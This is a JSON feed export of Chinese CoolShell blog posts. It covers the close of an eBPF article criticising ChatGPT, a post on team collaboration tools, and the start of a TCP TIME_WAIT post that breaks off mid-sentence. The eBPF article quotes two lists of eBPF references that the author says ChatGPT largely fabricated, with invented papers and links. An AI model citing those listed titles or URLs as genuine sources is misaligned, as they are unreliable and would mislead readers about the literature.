href=\"https://www.kernel.org/doc/html/latest/bpf/bpf_design_QA.html\" rel=\"nofollow\">BPF Design Q&amp;A</a></li>\n<li>还有 Github 上的 <a href=\"https://github.com/zoidbergwill/awesome-ebpf\" target=\"_blank\" rel=\"noopener\">Awesome eBPF</a></li>\n</ul>\n<h4>彩蛋</h4>\n<p>最后来到彩蛋环节。因为最近 ChatGPT 很火，于是，我想通过 ChatGPT 来帮助我书写这篇文章，一开始我让ChatGPT 帮我列提纲，并根据提纲生成文章内容，并查找相关的资料，非常之顺利，包括生成的代码，我以为我们以很快地完成这篇文章。</p>\n<p>但是，到了代码生成的时候，我发现，ChatGPT 生成的代码的思路和方法都是对的，但是是比较老的，而且是跑不起来的，<strong>出现了好些低级错误，如：使用了未声明的变量，没有引用完整的C语言的头文件，没有正确地初始化变量，错误地获取数据，类型没有匹配……等等</strong>，在程序调试上，挖了很多的坑，C语言本来就不好搞，挖的很多运行时的坑很难察觉，所以，耗费了我大量的时间来排除各种各样的问题，其中有环境上的问题，还有代码上的问题，这些问题即便是通过 Google 也不容易找到解决方案，我找到的解决方案都放在文章中了，尤其是第二个示例，让我调试了3个多小时，读了很多 bcc 上的issue和相关的晦涩的手册和文档，才让程序跑通。</p>\n<p>到了文章收关的阶段，我让ChatGPT 给我几个延伸阅读，也是很好的，但是没有给出链接，于是我只得人肉 Google 了一下，然后让我吃惊的是，<strong>好多ChatGPT给出来的文章是根本不存在的，完全是它伪造的</strong>。我连让它干了两次都是这样，这个让我惊掉大牙。这让我开始怀疑它之前生成的内容，于是，我不得我返回仔细Review我的文章，尤其是“介绍”、“用途”和“工作原理”这三个章节，基本都是ChatGPT生成的，在Review完后，我发现了ChatGPT 给我生造了一个叫 “无损编译器”的术语，这个术语简直了，于是我开始重写我的文章。我把一些段落重写了，有一些没有，保留下来的我都标记上了 <code>[1]</code>，大家读的时候要小心阅读。</p>\n<p>最后，<strong>我的结论是，ChatGPT只是一个不成熟的玩具，只能回答一些没有价值的日常聊天的问题，要说能取代Google，我觉得不可能，因为Google会基于基本的事实，而ChatGPT会基于内容生成的算法，在造假方面称得上是高手，可以列为电信诈骗的范畴了，我以后不会再使用ChatGPT生成文章内容或是作我的帮手了。StackOverflow把其ban了真是不能太赞了！</strong></p>\n<p><strong>附件一：ChatGPT的造假载图和样本</strong></p>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td>\n<p><figure id=\"attachment_22325\" aria-describedby=\"caption-attachment-22325\" style=\"width: 195px\" class=\"wp-caption aligncenter\"><a href=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1.png\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22325 size-medium\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-195x300.png\" alt=\"\" width=\"195\" height=\"300\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-195x300.png 195w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-665x1024.png 665w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-768x1183.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-997x1536.png 997w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-175x270.png 175w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1.png 1096w\" sizes=\"(max-width: 195px) 100vw, 195px\" /></a><figcaption id=\"caption-attachment-22325\" class=\"wp-caption-text\">点击看大图</figcaption></figure></td>\n<td>\n<p><figure id=\"attachment_22326\" aria-describedby=\"caption-attachment-22326\" style=\"width: 286px\" class=\"wp-caption aligncenter\"><a href=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2.png\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22326 size-medium\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-286x300.png\" alt=\"\" width=\"286\" height=\"300\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-286x300.png 286w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-978x1024.png 978w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-768x804.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-258x270.png 258w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2.png 1096w\" sizes=\"(max-width: 286px) 100vw, 286px\" /></a><figcaption id=\"caption-attachment-22326\" class=\"wp-caption-text\">点击看大图</figcaption></figure></td>\n</tr>\n</tbody>\n</table>\n<p><strong>ChatGPT 生成的样本一</strong></p>\n<ul>\n<li>Brendan Gregg 的《BPF Performance Tools: Linux System and Application Observability》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。</li>\n<li>Alexei Starovoitov 在 2015 年的 LPC 大会上发表的《eBPF and XDP: fast programmable datapath in the Linux kernel》一文，是一个介绍 eBPF 和 XDP（eXpress Data Path）的综述。</li>\n<li>谷歌的《BPF: The Future of Linux Monitoring and Observability》一文介绍了 eBPF 的基本概念，并探讨了它对于 Linux 监控和可观察性的影响。</li>\n<li>微软的《A Survey of Techniques for Hardware Acceleration of BPF》一文，介绍了 eBPF 在硬件加速方面的研究现状。</li>\n<li>Daniel Borkmann 的《Linux kernel networking: implementation and theory》一书涵盖了 eBPF 的实现和理论。</li>\n<li>Martin KaFai Lau 在 2015 年的 SOSP 大会上发表的《eBPF: a new execution environment for the Linux kernel》一文，介绍了 eBPF 在 Linux 内核中的新执行环境。</li>\n<li>来自两名谷歌工程师的《eBPF: A New Frontier in Performance Analysis》一文，探讨了 eBPF 对性能分析的影响。</li>\n<li>《BPF Performance Tools: Linux System and Application Observability》一书中的第三章，讨论了 eBPF 的编译器和运行时系统。</li>\n<li>来自三名谷歌工程师的《eBPF: The New Solaris DTrace》一文，比较了 eBPF 和 Solaris DTrace 系统的区别。</li>\n</ul>\n<p><strong>ChatGPT 生成的样本二</strong></p>\n<ol>\n<li>eBPF 程序开发指南（<a href=\"https://cilium.io/doc/ebpf/ebpf-guide/\" target=\"_new\" rel=\"noopener\">https://cilium.io/doc/ebpf/ebpf-guide/</a>）</li>\n<li>eBPF 官方文档（<a href=\"https://www.kernel.org/doc/Documentation/networking/filter.txt\" target=\"_new\" rel=\"noopener\">https://www.kernel.org/doc/Documentation/networking/filter.txt</a>）</li>\n<li>Linux 内核 eBPF 介绍（<a href=\"https://www.ibm.com/developerworks/cn/linux/kernel/ebpf/index.html\" target=\"_new\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/linux/kernel/ebpf/index.html</a>）</li>\n<li>eBPF 性能优化技巧（<a href=\"https://www.infoq.com/cn/news/2018/08/ebpf-performance-tips/\" target=\"_new\" rel=\"noopener\">https://www.infoq.com/cn/news/2018/08/ebpf-performance-tips/</a>）</li>\n<li>eBPF 实战经验分享（<a href=\"https://blog.cloudflare.com/ebpf-in-practice/\" target=\"_new\" rel=\"noopener\">https://blog.cloudflare.com/ebpf-in-practice/</a>）</li>\n<li>eBPF 在网络安全中的应用（<a href=\"https://www.zdnet.com/article/ebpf-how-to-use-it-for-network-security/\" target=\"_new\" rel=\"noopener\">https://www.zdnet.com/article/ebpf-how-to-use-it-for-network-security/</a>）</li>\n<li>eBPF 实现 Linux 系统性能监控（<a href=\"https://www.percona.com/blog/2017/08/15/how-to-use-ebpf-to-monitor-linux-system-performance/\" target=\"_new\" rel=\"noopener\">https://www.percona.com/blog/2017/08/15/how-to-use-ebpf-to-monitor-linux-system-performance/</a>）</li>\n<li>eBPF 入门教程（<a href=\"https://sysdig.com/blog/ebpf-getting-started/\" target=\"_new\" rel=\"noopener\">https://sysdig.com/blog/ebpf-getting-started/</a>）</li>\n<li>eBPF 与 BPF 比较（<a href=\"https://lwn.net/Articles/724647/\" target=\"_new\" rel=\"noopener\">https://lwn.net/Articles/724647/</a>）</li>\n<li>eBPF 提高课程（<a href=\"https://www.pluralsight.com/courses/ebpf-advanced\" target=\"_new\" rel=\"noopener\">https://www.pluralsight.com/courses/ebpf-advanced</a>）</li>\n</ol>\n<p><strong>附件二：发明的术语：无损编译器</strong></p>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td>\n<p><figure id=\"attachment_22328\" aria-describedby=\"caption-attachment-22328\" style=\"width: 180px\" class=\"wp-caption aligncenter\"><a href=\"https://coolshell.cn/wp-content/uploads/2022/12/fake.png\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22328 size-medium\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/fake-180x300.png\" alt=\"\" width=\"180\" height=\"300\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/12/fake-180x300.png 180w, https://coolshell.cn/wp-content/uploads/2022/12/fake-616x1024.png 616w, https://coolshell.cn/wp-content/uploads/2022/12/fake-768x1277.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/fake-924x1536.png 924w, https://coolshell.cn/wp-content/uploads/2022/12/fake-162x270.png 162w, https://coolshell.cn/wp-content/uploads/2022/12/fake.png 1080w\" sizes=\"(max-width: 180px) 100vw, 180px\" /></a><figcaption id=\"caption-attachment-22328\" class=\"wp-caption-text\">点击看大图</figcaption></figure></td>\n<td>\n<p><figure id=\"attachment_22335\" aria-describedby=\"caption-attachment-22335\" style=\"width: 223px\" class=\"wp-caption aligncenter\"><a href=\"https://coolshell.cn/wp-content/uploads/2022/12/fake.term_.png\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22335 size-medium\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-223x300.png\" alt=\"\" width=\"223\" height=\"300\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-223x300.png 223w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-761x1024.png 761w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-768x1033.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-1142x1536.png 1142w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-201x270.png 201w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_.png 1176w\" sizes=\"(max-width: 223px) 100vw, 223px\" /></a><figcaption id=\"caption-attachment-22335\" class=\"wp-caption-text\">点击看大图</figcaption></figure></td>\n</tr>\n</tbody>\n</table>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/1379.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/13.jpg\" alt=\"如何调试bash脚本\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/1379.html\" class=\"wp_rp_title\">如何调试bash脚本</a></li><li ><a href=\"https://coolshell.cn/articles/19219.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png\" alt=\"打造高效的工作环境 &#8211; Shell 篇\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/19219.html\" class=\"wp_rp_title\">打造高效的工作环境 &#8211; Shell 篇</a></li><li ><a href=\"https://coolshell.cn/articles/18654.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png\" alt=\"记一次Kubernetes/Docker网络排障\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/18654.html\" class=\"wp_rp_title\">记一次Kubernetes/Docker网络排障</a></li><li ><a href=\"https://coolshell.cn/articles/18360.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg\" alt=\"程序员练级攻略（2018)  与我的专栏\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/18360.html\" class=\"wp_rp_title\">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href=\"https://coolshell.cn/articles/17998.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg\" alt=\"Linux PID 1 和 Systemd\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/17998.html\" class=\"wp_rp_title\">Linux PID 1 和 Systemd</a></li><li ><a href=\"https://coolshell.cn/articles/17416.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2016/07/cache-150x150.png\" alt=\"缓存更新的套路\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/17416.html\" class=\"wp_rp_title\">缓存更新的套路</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22320.html\">eBPF 介绍</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "C/C++语言",
          "link": "https://coolshell.cn/articles/22320.html",
          "creator": "陈皓",
          "pubDate": "Sat, 10 Dec 2022 02:38:51 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "4b6a3161ed91163fcd3af5a9d394b61a",
          "highlights": []
        },
        {
          "title": "聊聊团队协同和协同工具",
          "description": "<p>这两天跟 Cali 和 Rather 做了一个线上的 Podcast &#8211; Ep.5 一起聊聊团队协同。主要是从 IM 工具扩展开来聊了一下团队的协同...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22298.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22298.html\">聊聊团队协同和协同工具</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-medium wp-image-22308\" src=\"https://coolshell.cn/wp-content/uploads/2022/10/communication-300x168.png\" alt=\"\" width=\"300\" height=\"168\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/10/communication-300x168.png 300w, https://coolshell.cn/wp-content/uploads/2022/10/communication-1024x574.png 1024w, https://coolshell.cn/wp-content/uploads/2022/10/communication-768x431.png 768w, https://coolshell.cn/wp-content/uploads/2022/10/communication-1536x861.png 1536w, https://coolshell.cn/wp-content/uploads/2022/10/communication-482x270.png 482w, https://coolshell.cn/wp-content/uploads/2022/10/communication.png 1680w\" sizes=\"(max-width: 300px) 100vw, 300px\" />这两天跟 <a href=\"https://twitter.com/CaliCastleMusic\" target=\"_blank\" rel=\"noopener\">Cali</a> 和 <a href=\"https://twitter.com/RatherJie\" target=\"_blank\" rel=\"noopener\">Rather</a> 做了一个线上的 <a href=\"https://kjsyp.fm/podcasts/43961/episodes/ep5-ft-megaease\" target=\"_blank\" rel=\"noopener\">Podcast &#8211; Ep.5 一起聊聊团队协同</a>。主要是从 IM 工具扩展开来聊了一下团队的协同和相应的工具，但是聊天不是深度思考，有一些东西我没有讲透讲好，所以，我需要把我更多更完整更结构化的想法形成文字。（注：聊天聊地比较详细，本文只是想表达我的主要想法）</p>\n<h4>国内外的企业 IM 的本质差别</h4>\n<p>国内企业级在线交流工具主要有：企业微信、钉钉、飞书，国外的则是：Slack、Discord这两大IM工具，你会发现，他们有很多不一样的东西，<strong>其中有两个最大的不同，一个是企业管理，一个是企业文化。</strong></p>\n<h5>企业管理</h5>\n<p><strong>Slack/Discrod 主要是通过建 Channel ，而国内的IM则主要是拉群</strong>。你可能会说，这不是一样的吗？其实是不一样的，很明显，Channel 的属性是相对持久的，而群的属性则是临时的，前者是可以是部门，可以是团队，可以是项目，可以是产品，可以是某种长期存在的职能（如：技术分享），而拉群则是相对来说临时起意的，有时候，同样的人群能被重复地拉出好几次，因为之前临时起意的事做完了，所以群就被人所遗忘了，后面再有事就再来。<strong>很明显，Channel 这种方式明显是有管理的属性的，而拉群则是没有管理的</strong>。</p>\n<p><span id=\"more-22298\"></span></p>\n<p>所以，在国内这种作坊式，野蛮粗放式的管理风格下，他们需要的就是想起一出是一出的 IM 工具，所以，拉群就是他们的工作习惯，因为没有科学的管理，所以没有章法，所以，他们不需要把工作内的信息结构化的工具。而国外则不然，国外的管理是精细化的，国外的公司还在重度使用 Email 的通讯方式，而 Email 是天生会给一个主题时行归类，而且 Email 天生不是碎片信息，所以，国外的 IM 需要跟 Email 竞争，因为像 Email 那样给邮件分类，把信息聚合在一个主题下的方式就能在 IM 上找到相关的影子。Channel 就是一个信息分类，相当于邮件分类，Slack 的 回复区和 Discord 的子区就像是把同一个主题信息时行聚合的功能。这明显是懂管理的人做的，而国内的拉群一看就是不懂管理的人干的，或者说是就是满足这些不懂管理的人的需求的。</p>\n<h5>企业文化</h5>\n<p>团队协作和团队工作最大的基石是信任，如果有了信任，没有工具都会很爽，如果没有信任，什么工具都没用。信任是一种企业文化，这种文化不仅包括同级间的，还包括上下级间的。但是，因为国内的管理跟不上，所以，就导致了各种不信任的文化，而需要在这里不信任的文化中进行协同工作，国内的 IM 软件就会开发出如下在国外的 IM 中完全没有的功能：</p>\n<ul>\n<li><strong>监控员工</strong>。获取员工的工作时间以及工作位置。</li>\n<li><strong>有详细的已读标注</strong>。这样会给对方要回复的压力。</li>\n<li> <strong>发出的信息不能修改，不能删除，非常有限地可撤回</strong>。</li>\n</ul>\n<p>而国外的 IM 则是，发出的信息可以修改/删除，没有已读标准，也不会监控员工。这种时候，我总是会对工作在这种不信任文化中人感到可怜……如果大家需要靠逼迫的方式把对方拉来跟我一起协作，我们还工作个什么劲啊。</p>\n<h5>小结</h5>\n<p>所以，我们可以看到，<strong>畸形的企业管理和企业文化下，就会导致畸形的协同工具</strong>。最令人感到悲哀的是，有好多同学还觉得国内的钉钉非常之好，殊不知，你之所以感觉好用，是因为你所在的环境是如此的不堪。你看，<strong>人到了不同的环境就会有不同的认识，所以，找一个好一些的环境对一个人的成长有多重要</strong>。</p>\n<p>给一些新入行的人的建议就是，一个环境对一个人的认知会有非常大的影响，找一个好的环境是非常重要，如果不知道什么 环境是好的，那就先从不使用钉钉为工作协同软件的公司开始吧……</p>\n<h4>什么是好的协同工具</h4>\n<p>我们从上面可以得到，协同的前提条件是你需要有一个基于信任的企业文化，还需要有有结构化思维的科学的管理思维。没有这两个东西，给你的团队再多的工具都不可能有真正好有协同的，大家就是装模作样罢了。</p>\n<p>假设我们的管理和文化都没有问题，那下面我们来谈谈协同工具的事。</p>\n<p>我个人觉得 IM 这种工具包括会议都不是一种好的协同工具，因为这些工具都无法把信息做到真正的结构化和准确化，用 IM 或是开会上的信息大多都是碎片化严重，而且没有经过深度思考或是准备的，基本都是即兴出来的东西，不靠谱的概率非常大。</p>\n<p>找人交流和开会不是有个话题就好的，还需要一个可以讨论的“议案”。在 Amazon 里开会，会前，组织方会把要讨论的方案打印出来给大家看，这个方案是深思过的，是验证过的，是有数据和证据或是引用支撑的，会议开始后，10 -15分钟是没有人说话的，大家都在看文档，然后就开始直接讨论或发表意见，支持还是不支持，还是有条件支持……会议效率就会很高。</p>\n<p>但是这个议案其实是可以由大家一起来完成的，所以，连打印或是开会都不需要。试想一下，使用像 Google Doc 这样的协同文档工具，把大家拉到同一个文档里直接创作，不香吗？我在前段时间，在公网上组织大家来帮我完成一个《<a href=\"https://docs.google.com/document/d/1-c93ax4Uog_CHTOLBKpKLNCUtZYwacGbXm8OP3Fh810\" target=\"_blank\" rel=\"noopener\">非常时期的囤货手册</a>》，这篇文章的形成有数百个网友的加持，而我就是在做一个主编的工作，这种工作是 IM 工具无法完成的事。与之类似的协同工具还有大家一起写代码的 Github，大家一起做设计的 Figma……这样创作类的协同工具非常多。另外，好多这些工具都能实时展示别人的创作过程，这个简直是太爽了，你可以通过观看他人创作过程，学习到很多他人的思路和想法，这个在没有协同工具的时代是很难想像的。</p>\n<p>好的协同工具是可以互相促进互相激励的，就像一个足球队一样，当你看到你的队友在勇敢地争抢，拼命地奔跑，你也会被感染到的。</p>\n<p>所以，<strong>好的协同就是能够跟一帮志同道合，有共同目标，有想法，有能力的人一起做个什么事</strong>。<strong>所以，在我心中我最喜欢的协同工具从来都是创作类的，不是管理类的，更不是聊天类的。</strong>管理和聊天的协同软件会让你产生一种有产出的假象，但其实不同，这种工具无论做的有多好，都是支持性的工具，不是产出类的工具，不会提升生产力的。</p>\n<p>另外，在创作类的协同工具上如果有一些智能小帮手，如：Github 发布的 Copilot。那简直是让人爽翻天了，所以，真正能提升生产力的工具都是在内容上帮得到你的。</p>\n<h4>结束语</h4>\n<p>我其实并不喜欢今天所有的 IM 工具，因为我觉得信息不是结构化的，信息是有因果关系和上下文的，是结构化的，是多维度的，不是今天这种线性的方式，我们想像一下“脑图”或是知识图，或是 wikipedia 的网关的关联，我们可能就能想像得到一个更好的 IM 应该是什么 样的……</p>\n<p>协同工作的想像空间实在是太大了，我觉得所有的桌面端的软件都会被协作版的重写，虽然，这种协作软件需要有网络的加持，但是协作软件的魅力和诱惑力实在的太大了，让人无法不从……</p>\n<p>未来的企业，那些管理类的工具一定会被边缘化的，聊天类的会被打成一个通知中心，而创作类的会大放异彩，让大家直接在要干的事上进行沟通、交互和分享。</p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/22173.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png\" alt=\"“一把梭：REST API 全用 POST”\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22173.html\" class=\"wp_rp_title\">“一把梭：REST API 全用 POST”</a></li><li ><a href=\"https://coolshell.cn/articles/22157.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg\" alt=\"谈谈公司对员工的监控\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22157.html\" class=\"wp_rp_title\">谈谈公司对员工的监控</a></li><li ><a href=\"https://coolshell.cn/articles/21589.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg\" alt=\"如何做一个有质量的技术分享\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21589.html\" class=\"wp_rp_title\">如何做一个有质量的技术分享</a></li><li ><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png\" alt=\"程序员如何把控自己的职业\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_title\">程序员如何把控自己的职业</a></li><li ><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg\" alt=\"MegaEase的远程工作文化\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_title\">MegaEase的远程工作文化</a></li><li ><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg\" alt=\"别让自己“墙”了自己\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_title\">别让自己“墙”了自己</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22298.html\">聊聊团队协同和协同工具</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "杂项资源",
          "link": "https://coolshell.cn/articles/22298.html",
          "creator": "陈皓",
          "pubDate": "Fri, 14 Oct 2022 04:20:38 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "e6052179d046b7af1a0ae9440af39038",
          "highlights": []
        },
        {
          "title": "从一次经历谈 TIME_WAIT 的那些事",
          "description": "<p>今天来讲一讲TCP 的 TIME_WAIT 的问题。这个问题尽人皆知，不过，这次遇到的是不太一样的场景，前两天也解决了，正好写篇文章，顺便把 TIME_WAIT...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22263.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22263.html\">从一次经历谈 TIME_WAIT 的那些事</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright\" src=\"https://coolshell.cn/wp-content/uploads/2022/07/wall_clock-300x167.jpeg\" alt=\"\" width=\"400\" height=\"222\" />今天来讲一讲TCP 的 <code>TIME_WAIT</code> 的问题。这个问题尽人皆知，不过，这次遇到的是不太一样的场景，前两天也解决了，正好写篇文章，顺便把 <code>TIME_WAIT</code> 的那些事都说一说。对了，这个场景，跟我开源的探活小工具 <a href=\"https://github.com/megaease/easeprobe\">EaseProbe</a> 有关，我先说说这个场景里的问题，然后，顺着这个场景跟大家好好说一下这个事。</p>\n<h4>问题背景</h4>\n<p>先说一下背景，<a href=\"https://github.com/megaease/easeprobe\">EaseProbe</a> 是一个轻量独立的用来探活服务健康状况的小工具，支持http/tcp/shell/ssh/tls/host以及各种中间件的探活，然后，直接发送通知到主流的IM上，如：Slack/Telegram/Discrod/Email/Team，包括国内的企业微信/钉钉/飞书， 非常好用，用过的人都说好 <img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f60f.png\" alt=\"😏\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />。</p>\n<p>这个探活工具在每次探活的时候，必须要从头开始建立整个网络链接，也就是说，需要从头开始进行DNS查询，建立TCP链接，然后进行通信，再关闭链接。这里，我们不会设置 TCP 的 KeepAlive 重用链接，因为探活工具除了要探活所远端的服务，还要探活整个网络的情况，所以，每次探活都需要从新来过，这样才能捕捉得到整个链路的情况。</p>\n<p><span id=\"more-22263\"></span></p>\n<p>但是，这样不断的新建链接和关闭链接，根据TCP的状态机，我们知道这会导致在探测端这边出现的 <code>TIME_WAIT</code> 的 TCP 链接，根据 TCP 协议的定义，这个 TIME_WAIT 需要等待 2倍的MSL 时间，TCP 链接都会被系统回收，在回收之前，这个链接会占用系统的资源，主要是两个资源，一个是文件描述符，这个还好，可以调整，另一个则是端口号，这个是没法调整的，因为作为发起请求的client来说，在对同一个IP上理论上你只有64K的端口号号可用（实际上系统默认只有近30K，从32,768 到 60,999 一共 60999+1-32768=28,232，你可以通过 <code>sysctl net.ipv4.ip_local_port_range</code> 查看  ），如果 <code>TIME_WAIT</code> 过多，会导致TCP无法建立链接，还会因为资源消耗太多导致整个程序甚至整个系统异常。</p>\n<p>试想，如果我们以 10秒为周期探测10K的结点，如果TIME_WAIT的超时时间是120秒，那么在第60秒后，等着超时的 <code>TIME_WAIT</code> 我们就有可能把某个IP的端口基本用完了，就算还行，系统也有些问题。（注意：我们不仅仅只是TCP，还有HTTP协议，所以，大家不要觉得TCP的四元组只要目标地址不一样就好了，一方面，我们探的是域名，需要访问DNS服务，所以，DNS服务一般是一台服务器，还有，因为HTTPS一般是探API，而且会有网关代理API，所以链接会到同一个网关上。另外就算还可以建出站连接，但是本地程序会因为端口耗尽无法bind了。所以，现实情况并不会像理论情况那样只要四元组不冲突，端口就不会耗尽）</p>\n<h4>为什么要 TIME_WAIT</h4>\n<p>那么，为什么TCP在 <code>TIME_WAIT</code> 上要等待一个2MSL的时间？<code></code></p>\n<p>以前写过篇比较宏观的《TCP的那些事》（<a title=\"TCP 